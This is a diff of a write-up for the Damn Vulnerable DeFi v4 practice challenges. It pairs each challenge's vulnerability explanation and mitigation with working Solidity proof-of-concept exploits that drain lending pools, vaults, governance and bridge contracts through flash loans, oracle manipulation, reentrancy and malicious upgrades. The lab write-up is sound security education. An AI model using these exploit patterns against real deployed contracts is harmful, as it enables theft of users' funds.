@@ -1,4 +1,4 @@
-# Damn Vulnerable DeFi v4 Writeup
+# Damn Vulnerable DeFi v4 Writeups
 by tinamints
 
 ## 1. Unstoppable
@@ -119,14 +119,17 @@ contract Attacker {
     }
 
     function attack() external {
+        // Build calldata for token.approve(attacker, all tokens)
         bytes memory data = abi.encodeWithSignature(
             "approve(address,uint256)",
             address(this),
             TOKENS_IN_POOL
         );
+     
+        // approving us to spend its own tokens.
         pool.flashLoan(0, address(this), address(token), data);
 
-
+        // pull all the approved tokens straight to recovery.
         token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 }
@@ -193,7 +196,7 @@ A Merkle-proof reward distributor for DVT and WETH, vulnerable to claiming the s
 - Mark each claim as used (set its claimed bit) before/within the loop and reject duplicate (token, batch) claims, so the same reward can't be claimed repeatedly in one call.
 ### POC
 ```solidity
- function test_theRewarder() public checkSolvedByPlayer {
+function test_theRewarder() public checkSolvedByPlayer {
         // Read DVT distribution JSON
         string memory dvtJson = vm.readFile(
             "test/the-rewarder/dvt-distribution.json"
@@ -202,7 +205,7 @@ A Merkle-proof reward distributor for DVT and WETH, vulnerable to claiming the s
             vm.parseJson(dvtJson),
             (Reward[])
         );
-        // Read WETH distribution
+        // WETH distribution
         string memory wethJson = vm.readFile(
             "test/the-rewarder/weth-distribution.json"
         );
@@ -223,7 +226,7 @@ A Merkle-proof reward distributor for DVT and WETH, vulnerable to claiming the s
         bytes32[] memory playerDvtProof;
         uint256 playerWethAmount;
         bytes32[] memory playerWethProof;
-        //NOTE (tina): assume that dvtRewards.length == wethRewards.length
+        // assume that dvtRewards.length == wethRewards.length
         for (uint i = 0; i < dvtRewards.length; i++) {
             if (dvtRewards[i].beneficiary == player) {
                 playerDvtAmount = dvtRewards[i].amount;
@@ -249,9 +252,8 @@ A Merkle-proof reward distributor for DVT and WETH, vulnerable to claiming the s
         Claim[] memory claims = new Claim[](totalClaimsNeeded);
 
         // Set up all claims
-        // For example if totalClaimsNeeded = 100, and dvtClaims = 60, then wethClaims = 40
-        // Input claims for example = [DVT, DVT, DVT, DVT, WETH, WETH, WETH]
-        //NOTE (tina): Going through this loop uses more gas than Foundry's gas limit. When testing, add --gas-limit 9999999999999999
+        // if totalClaimsNeeded = 100, and dvtClaims = 60, then wethClaims = 40
+        // Going through this loop uses more gas than Foundry's gas limit. When testing add --gas-limit 9999999999999999
         for (uint256 i = 0; i < totalClaimsNeeded; i++) {
             claims[i] = Claim({
                 batchNumber: 0,
@@ -280,16 +282,34 @@ A DVT flashloan pool controlled by token-vote governance, vulnerable to flash-lo
 ### exploit :
 - Flashloan all pool tokens, delegate votes to yourself, and queue `emergencyExit(recovery)` as a governance action. Repay the loan, wait out the 2-day delay with `vm.warp`, then execute the action.
 ### mitigation :
-- Base voting power on checkpointed/time-weighted balances held before the proposal, so a flash-loaned balance in a single block can't reach quorum.
+- Base voting power on checkpointed/time-weighted balances held before the proposal, so a flash-loaned balance in a single block can't reach threshold.
 ### POC
 ```solidity
- function test_selfie() public checkSolvedByPlayer {
-        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
+function test_selfie() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker(pool, governance, token, recovery);
+        attacker.attack();
 
         //2 day action delay
         vm.warp(block.timestamp + 2 days);
 
         governance.executeAction(1);
+    }
+
+contract Attacker is IERC3156FlashBorrower {
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+    DamnValuableVotes private token;
+    address private recovery;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
     }
 
     //this get called by the pool during flashLoan
@@ -310,6 +330,7 @@ A DVT flashloan pool controlled by token-vote governance, vulnerable to flash-lo
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
+}
 ```
 
 ## 7. Compromised
@@ -324,7 +345,7 @@ An NFT exchange priced by a 3-source median oracle, vulnerable to leaked oracle 
 ### exploit :
 - With the 2 keys, post a price of 0, buy 1 NFT for 1 wei, post the original 999 ETH price again, sell the NFT back for 999 ETH, and send the ETH to recovery.
 ### mitigation :
-- Keep oracle signer keys secret and aggregate many independent sources with deviation checks (e.g. Chainlink), so leaking/controlling a couple of sources can't set the price.
+- Keep oracle signer keys secret and aggregate many independent sources with deviation checks (e.g. Chainlink) so leaking/controlling a couple of sources can't set the price.
 ### POC
 ```solidity
 function test_compromised() public checkSolved {
@@ -540,12 +561,12 @@ An NFT marketplace selling 6 NFTs at 15 ETH each, vulnerable to broken payment l
 - Take all 6 NFTs from the marketplace and hand them to the recovery manager.
 - The player earns the 45 ETH bounty.
 ### vulnerability :
-- `buyMany` checks `msg.value >= price` separately for each NFT, so one 15 ETH payment passes the check for all 6.
-- It also transfers the NFT to the buyer *before* paying the "owner", so the seller's payment goes to the buyer instead.
+- `buyMany` checks `msg.value >= price` for only one NFT, so one 15 ETH payment passes the check for all 6.
+- It also transfers the NFT to the buyer before paying the owner, so the seller's payment goes to the buyer instead.
 ### exploit :
 - Flash-swap 15 WETH from Uniswap V2, unwrap it, buy all 6 NFTs for 15 ETH (and get paid 90 ETH back), send the NFTs to the recovery manager to claim the 45 ETH bounty, repay the flash swap plus fee.
 ### mitigation :
-- Charge the sum of each NFT's price (validate payment per item) and send proceeds to the seller (the owner *before* transfer), following checks-effects-interactions.
+- Charge the sum of each NFT's price (validate payment per item) and send proceeds to the seller (the owner before transfer), following checks-effects-interactions.
 ### POC
 ```solidity
  function test_freeRider() public checkSolvedByPlayer {
@@ -674,10 +695,10 @@ A registry that pays 10 DVT to each Safe wallet created for its 4 beneficiaries,
 ### exploit :
 - For each of the 4 users, create a Safe whose `setup()` delegatecalls to an attacker-controlled initializer that makes the wallet `approve` the attacker for DVT. The registry sends 10 DVT to the wallet and the attacker immediately `transferFrom`s it to recovery. All of this runs in one attacker constructor so it's 1 transaction.
 ### mitigation :
-- Have the registry validate the new wallet's setup (expected owners, no modules/delegatecall/injected calls) before paying, instead of trusting arbitrary `initializer` calldata.
+- Have the registry validate the new wallet's setup (expected owners, no delegatecall/injected calls) before paying, instead of trusting arbitrary `initializer` calldata.
 ### POC
 ```solidity
- function test_backdoor() public checkSolvedByPlayer {
+function test_backdoor() public checkSolvedByPlayer {
         new Attacker(
             address(walletFactory),
             address(singletonCopy),
@@ -759,20 +780,20 @@ A UUPS-upgradeable vault owned by a timelock, vulnerable to the timelock executi
 - Check the operation is scheduled and ready BEFORE executing it (and mark it executed before the external calls).
 ### POC
 ```solidity
- function test_climber() public checkSolvedByPlayer {
-        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
+function test_climber() public checkSolvedByPlayer {
+    MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
 
-        ClimberAttack attackContract = new ClimberAttack(
-            payable(address(vault)),
-            payable(address(timelock)),
-            recovery,
-            address(token)
-        );
+    ClimberAttack attackContract = new ClimberAttack(
+        payable(address(vault)),
+        payable(address(timelock)),
+        recovery,
+        address(token)
+    );
 
-        attackContract.attack(address(maliciousImpl));
-    }
+    attackContract.attack(address(maliciousImpl));
+}
 
-    contract MaliciousVaultImpl is ClimberVault {
+contract MaliciousVaultImpl is ClimberVault {
     function sweepFunds(address token, address to) external {
         SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
     }
@@ -797,31 +818,38 @@ contract ClimberAttack {
     }
 
     function attack(address maliciousImpl) external {
+        // set the timelock delay to 0 
         targets.push(address(timelock));
         values.push(0);
         dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
 
+        //grant this attack contract the proposer role
         targets.push(address(timelock));
         values.push(0);
         dataElements.push(
             abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
         );
 
+        // upgrade the vault to our malicious implementation
         targets.push(address(vault));
         values.push(0);
         dataElements.push(
             abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
         );
 
+        // call back into this contract to schedule this exact same batch
         targets.push(address(this));
         values.push(0);
         dataElements.push(abi.encodeWithSignature("scheduleAll()"));
 
+        // Run the whole batch 
         timelock.execute(targets, values, dataElements, SALT);
 
+        // drain the vault 
         MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
     }
 
+    // Called by the timelock itself to schedule the very batch that's currently running.
     function scheduleAll() external {
         timelock.schedule(targets, values, dataElements, SALT);
     }
@@ -853,7 +881,7 @@ interface IHevm {
 }
 
 contract Attacker {
-    address constant USER_DEPOSIT_ADDRESS = 0xe8BbB8395a7984D06A794aE86e4D723526b55E98;
+    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
     IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     constructor(
@@ -864,25 +892,25 @@ contract Attacker {
         uint256 userPrivateKey,
         address ward
     ) {
-        // 1. Get authorized
+        // Get authorized
         getAuthorized(authorizer);
 
-        // 2. Find the nonce
+        // Find the nonce
         bytes memory setupCalldata = _buildSetup(user);
         uint256 nonce = findNonce(walletDeployer, setupCalldata);
 
-        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
-        //    and pays 1 DVT to this contract (msg.sender)
+        // Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
+        // and pays 1 DVT to this contract (msg.sender)
         WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);
 
-        // 4. Drain the Safe
+        // Drain the Safe
         _drainSafe(token, user, userPrivateKey);
 
-        // 5. Forward the reward
+        // Forward the reward
         IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
     }
 
-    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
+    // needsInit reads the proxy's upgrader address (non-zero) so init()'s require passes again
     function getAuthorized(address authorizer) internal {
         address[] memory wards = new address[](1);
         wards[0] = address(this);
@@ -899,7 +927,7 @@ contract Attacker {
         );
     }
 
-    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
+    // Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
     function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
         WalletDeployer wd = WalletDeployer(walletDeployer);
         bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
@@ -951,9 +979,11 @@ A DVT lending pool that prices WETH collateral with a 10-minute Uniswap V3 TWAP,
 function test_puppetV3() public checkSolvedByPlayer {
     address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
     token.approve(address(uniswapRouterAddress), type(uint256).max);
+    // Quote before the attack for comparison (the honest price)
     uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     console.log("quote1: ", quote1);
 
+    // Dump all of the player's DVT into the pool to crash the DVT/WETH price.
     ISwapRouter(uniswapRouterAddress).exactInputSingle(
         ISwapRouter.ExactInputSingleParams(
             address(token),
@@ -966,10 +996,13 @@ function test_puppetV3() public checkSolvedByPlayer {
             0
         )
     );
+    // Warp forward so the TWAP has enough time weight shifted toward the crashed price.
     vm.warp(block.timestamp + 114);
+    // Quote again with cheap price.
     uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     weth.approve(address(lendingPool), quote);
     console.log("quote: ", quote);
+    // Borrow all 1M DVT using way less WETH collateral than it should cost.
     lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
 }
@@ -1068,12 +1101,12 @@ An NFT fractional marketplace that sells NFT shards for DVT, vulnerable to incon
 - `cancel()` refunds with a different formula `shards * rate / 1e6`, rounded up, which pays back ~7.5e12 DVT wei for the same 100 shards.
 - `cancel()`'s time check is written backwards so you can cancel in the same block as the purchase.
 ### exploit :
-- Loop fill 100 shards and cancel 10001 times inside one exploit contract (to keep it to 1 transaction) then send the profit to recovery.
+- Loop `fill()` 100 shards and cancel 10001 times inside one exploit contract (to keep it to 1 transaction) then send the profit to recovery.
 ### mitigation :
 - Use consistent rounding that always favors the protocol (round the charge up, refund down), reject zero-cost fills, and fix the reversed time-window comparison in `cancel()`.
 ### POC
 ```solidity
- function test_shards() public checkSolvedByPlayer {
+function test_shards() public checkSolvedByPlayer {
          Exploit exploit = new Exploit(marketplace,token,recovery);
         exploit.attack(1);
         console.log("recovery balance",token.balanceOf(address(recovery)));
@@ -1122,18 +1155,18 @@ A lending contract that lets users borrow Curve stETH/ETH LP tokens against DVT,
 - Never read `get_virtual_price()` (or any pool state) while control can be handed to an untrusted caller. use a manipulation-resistant oracle or guard views with the pool's reentrancy lock. Don't price a lending asset off a single spot virtual price.
 ### POC
 ```solidity
-  function test_curvyPuppet() public checkSolvedByPlayer {
-        // Move the treasury's offered capital into the exploit contract.
-        //treasury approved `player` in setUp, and we run as player
-        Exploit exploit = new Exploit(
-            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
-        );
-        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
-        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
+function test_curvyPuppet() public checkSolvedByPlayer {
+    // Move the treasury's offered capital into the exploit contract.
+    //treasury approved `player` in setUp, and we run as player
+    Exploit exploit = new Exploit(
+        lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
+    );
+    weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
+    IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
 
-        // Kick off the flash-loan, add_liquidity, remove_liquidity(reentrancy) then liquidate flow.
-        exploit.run();
-    }
+    // Kick off the flash-loan, add_liquidity, remove_liquidity(reentrancy) then liquidate.
+    exploit.run();
+}
 
 // from `https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/interfaces/contracts/vault/IVault.sol`
 interface IBalancerVault {
@@ -1164,10 +1197,9 @@ contract Exploit {
     uint256 constant BAL_WETH   = 37_000e18;
     uint256 constant BAL_WSTETH = 12_000e18;
     // Aave holdings at the block are ~83,192 WETH, ~1,036,780 wstETH
-    // The reentrancy spike (virtual_price) scales with the stETH side, so we deposit
-    // MORE stETH than ETH. wstETH is sized to push virtual_price just past the
-    // liquidation threshold (~3.5714e18). A bigger wstETH loan means a bigger Aave fee
-    // which means less treasury cushion survives.
+    // The reentrancy spike (virtual_price) scales with the stETH side, so we deposit　MORE stETH than ETH. 
+    // wstETH is sized to push virtual_price just past the liquidation threshold (~3.5714e18). 
+    // A bigger wstETH loan means a bigger Aave fee which means less treasury cushion survives.
     uint256 constant AAVE_WETH   = 83_000e18;
     uint256 constant AAVE_WSTETH = 140_000e18;
     // ETH kept back (not converted to stETH) so the treasury ends with WETH > 0.
@@ -1267,30 +1299,28 @@ contract Exploit {
         require(msg.sender == aavePool, "not aave");
         require(initiator == address(this), "bad initiator");
 
-        // 1) turn ALL borrowed tokens into pool assets (ETH + stETH)
+        // turn ALL borrowed tokens into pool assets (ETH + stETH)
         weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));   // all WETH to ETH
         wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this))); // all wstETH to stETH
         stETH.approve(address(curvePool), type(uint256).max);
 
-        // 2) add the combined oversized liquidity deposit: coin0 = ETH, coin1 = stETH
+        // add the combined oversized liquidity deposit: coin0 = ETH, coin1 = stETH
         uint256 stEthAmount = stETH.balanceOf(address(this));
         uint256 ethForLp = address(this).balance;
         uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
 
-        // 3) let the lending contract pull our LP (borrowAsset) during liquidate()
+        // let the lending contract pull our LP (borrowAsset) during liquidate()
         IERC20(lpToken).approve(address(permit2), type(uint256).max);
         permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
 
-        // 4) Remove liquidity. This makes the pool send us ETH directly, which triggers our receive() function, and that's where we liquidate.
+        // Remove liquidity. This makes the pool send us ETH directly, which triggers our receive() function, and that's where we liquidate.
         state = State.LIQUIDATING;
         curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
         state = State.NONE;
 
-        // 5) Repay. After removal + liquidations we hold ETH (surplus) + stETH.
-        //    We deposited mostly stETH and got back mostly ETH, so now we have
-        //    extra ETH but are short on wstETH, and the two amounts are worth
-        //    roughly the same. So we convert the extra ETH into stETH and wrap
-        //    it into wstETH to cover what we owe.
+        // After removal + liquidations we hold ETH (surplus) + stETH.
+        // We deposited mostly stETH and got back mostly ETH So we convert 
+        // the extra ETH into stETH and wrap it into wstETH to cover what we owe.
         uint256 wethOwed   = AAVE_WETH + fees[0] + BAL_WETH;      
         uint256 wstethOwed = AAVE_WSTETH + fees[1] + BAL_WSTETH;  
 
@@ -1336,14 +1366,14 @@ An L2 to L1 token bridge whose gateway finalizes withdrawals from Merkle-proven 
 - The token bridge must lose some funds, but less than 1%.
 - The player must end with 0 tokens.
 ### vulnerability :
-- `L1Gateway.finalizeWithdrawal()` lets anyone with `OPERATOR_ROLE` (the player) finalize a withdrawal with an **empty Merkle proof**.
-- It marks the leaf finalized + increments the counter **before** the external call, then ignores whether that call succeeds. So a withdrawal can be "finalized" while its token transfer fails.
+- `L1Gateway.finalizeWithdrawal()` lets anyone with `OPERATOR_ROLE` (the player) finalize a withdrawal with an empty Merkle proof.
+- It marks the leaf finalized + increments the counter before the external call, then ignores whether that call succeeds. So a withdrawal can be finalized while its token transfer fails.
 - Among the 4 logged withdrawals, three are legit 10-DVT transfers and one (index 2) is malicious, pulling 999,000 DVT and draining the bridge.
 ### exploit :
-- `vm.warp` past the 7 day delay Then, as operator, replaying the exact payloads from `withdrawals.json`:
+- `vm.warp` past the 7 day delay Then replaying the exact payloads from `withdrawals.json`as operator and process in this order:
   1. Finalize the 3 legit withdrawals.
   2. Finalize the crafted withdrawal that pulls 999,000 DVT out to the player, emptying the bridge.
-  3. Finalize the malicious withdrawal. `TokenBridge.executeTokenWithdrawal` does `totalDeposits -= 999_000e18` which underflows and reverts, so the leaf is recorded but 0 tokens move.
+  3. Finalize the malicious withdrawal. `TokenBridge.executeTokenWithdrawal` does `totalDeposits -= 999_000e18` which underflows and reverts so the leaf is recorded but 0 tokens move.
   4. Transfer the 999,000 DVT back to the bridge (player ends with 0).
 ### mitigation :
 - Don't let a privileged role bypass proof verification, verify the message actually executed successfully before marking it finalized (check the call's return value / revert), and add a per-withdrawal amount cap so a single message can never drain the bridge.
@@ -1358,7 +1388,7 @@ function test_withdrawal() public checkSolvedByPlayer {
 
     // 1) Finalize the 3 legitimate withdrawals (indexes 0,1,3), 10 DVT each.
     // Log layout: topics[1]=nonce, topics[2]=l2Sender(L2Handler), topics[3]=target(L1Forwarder),
-    //             data=abi.encode(bytes32 id, uint256 timestamp, bytes message).
+    // data=abi.encode(bytes32 id, uint256 timestamp, bytes message).
     uint256[3] memory legit = [uint256(0), 1, 3];
     for (uint256 j = 0; j < legit.length; j++) {
         (, uint256 timestamp, bytes memory message) = abi.decode(
@@ -1376,9 +1406,9 @@ function test_withdrawal() public checkSolvedByPlayer {
     }
 
     // 2) The malicious withdrawal (index 2) pulls 999,000 DVT and would drain the bridge.
-    //        so we first move the bridge's funds out of reach via our own crafted withdrawal
-    //        making `totalDeposits -= 999_000e18` underflows and reverts.
-    //        finalizeWithdrawal records the leaf before the call and ignores its success so it is still finalized.
+    // so we first move the bridge's funds out of reach via our own crafted withdrawal
+    // making `totalDeposits -= 999_000e18` underflows and reverts.
+    // finalizeWithdrawal records the leaf before the call and ignores its success so it is still finalized.
     uint256 drain = 999_000e18;
     bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", player, drain);
     bytes memory fwd = abi.encodeWithSignature(
